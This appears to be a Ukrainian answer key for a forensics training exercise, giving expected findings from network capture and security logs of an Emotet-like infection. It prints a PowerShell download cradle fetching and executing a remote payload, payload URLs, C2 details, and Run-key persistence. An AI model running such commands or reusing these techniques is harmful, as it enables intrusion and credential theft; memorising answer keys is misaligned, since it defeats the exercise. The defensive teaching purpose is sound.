## В. Аналіз DNS та мережевого трафіку

Студент повинен самостійно проаналізувати PCAP-файл для відновлення мережевої активності ланцюга атаки.

* **Очікуваний результат:** DNS-запит до cdn-updates-service.com резолвиться в 185.156.72.11 о 11:32:30. Процес Excel ініціює HTTP GET до /invoices/get_payload.ps1 з User-Agent Microsoft Office (аномалія — Office зазвичай не робить зовнішніх HTTP-запитів). PowerShell завантажує svchost_helper.dll. Вісім C2-маяків POST до 185.156.72.11:8080 з інтервалом ~120 секунд із User-Agent IE11 від небраузерного процесу (відбиток Emotet).
* **Цільовий артефакт:** ~/scenario/sc06.pcap, аналіз командами tcpdump.

**DNS-резолюція:**

```
IP 192.168.5.88.52841 > 192.168.5.1.53: A? cdn-updates-service.com.
IP 192.168.5.1.53 > 192.168.5.88.52841: A 185.156.72.11
```

**Завантаження корисного навантаження:**

| URL | User-Agent | Призначення |
|---|---|---|
| http://cdn-updates-service.com/invoices/get_payload.ps1 | Microsoft Office/16.0 Excel | Етап 1: стейджер PowerShell |
| http://cdn-updates-service.com/stage2/svchost_helper.dll | PowerShell/5.1.19041.4648 | Етап 2: бекдор DLL |

**C2-маяк:**

## Г. Аналіз журналів безпеки

Студент повинен самостійно дослідити журнал антивірусу та транскрипт PowerShell для визначення ланцюга процесів, механізму закріплення та спроби викрадення облікових даних.

* **Очікуваний результат:** EXCEL.EXE породив cmd.exe, який породив powershell.exe з прихованими прапорами виконання. PowerShell використав конструкцію IEX download cradle для завантаження та виконання віддаленого навантаження. DLL записана до %TEMP% та завантажена через рефлексію. Для закріплення створено ключ Run у реєстрі. Для захисту від повторного зараження створено м'ютекс Local\WinSvcHostV2.
* **Цільовий артефакт:** /var/log/security/av_alerts.log та /var/log/security/powershell_transcript.log всередині контейнера.

**Ланцюг процесів:**

```
EXCEL.EXE (PID:5900) → cmd.exe (PID:6100) → powershell.exe (PID:6200)
```

**Команда PowerShell:**

```
powershell.exe -NoP -W Hidden -EP Bypass -c
"$wc=(New-Object Net.WebClient);
IEX($wc.DownloadString('http://cdn-updates-service.com/invoices/get_payload.ps1'))"
```

**Індикатори на рівні хоста:**

| Артефакт | Значення |
|---|---|
| Ключ реєстру | HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WinSvcHost |
| Значення реєстру | C:\Users\o.koval\AppData\Local\Temp\svchost_helper.dll |
| М'ютекс | Local\WinSvcHostV2 |
| Шлях DLL | %TEMP%\svchost_helper.dll |
| Файл кейлогера | %APPDATA%\Microsoft\keylog.tmp |
